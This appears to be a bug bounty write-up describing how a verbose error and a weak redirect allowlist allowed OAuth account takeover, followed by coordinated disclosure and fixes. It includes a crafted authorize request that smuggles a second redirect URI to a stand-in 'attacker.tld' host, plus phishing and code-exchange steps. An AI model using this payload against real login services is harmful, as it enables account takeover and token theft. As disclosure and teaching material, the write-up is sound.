---
title: "Bug Bounty: Escalating OAuth Misconfigurations"
summary: "How a verbose error message and weak redirect whitelist led to full account takeover in a production SaaS platform."
pubDate: "2024-01-29"
heroImage: "/images/writeups/oauth/hero.jpg"
tags:
  - Bug Bounty
  - OAuth2
  - Web Security
  - AppSec
tools:
  - Burp Suite
  - AuthAnalyzer
  - mitmproxy
---

## Discovery

Recon started with a standard discovery of OAuth clients in the target domain. An authorization request with a crafted `redirect_uri` produced a stack trace revealing the internal validation library in use.

```http
GET /oauth/authorize?response_type=code&client_id=prod-app&redirect_uri=https://attacker.tld/callback%23 HTTP/1.1
Host: login.target.tld
```

The parser ignored everything after `#`, allowing me to smuggle a second URI that landed the code grant on my controlled host.

## Weaponizing the Flow

1. Created a victim session using a legitimate login.
2. Sent them a phishing link with the dual redirect payload.
3. Received the authorization code at `https://attacker.tld/callback` and exchanged it for tokens.

![Proxy capture of the authorization code](/images/writeups/oauth/proxy-trace.png)

## Coordinated Disclosure

- Reported the finding with proof-of-concept scripts and recommended enforcing exact-match redirects.
- Engineering teams added PKCE enforcement and moved to strict allowlists.
- Security leadership implemented quarterly OAuth configuration reviews across all business units.

**Bounty result:** High severity payout plus an invitation to review their staged API revamp.
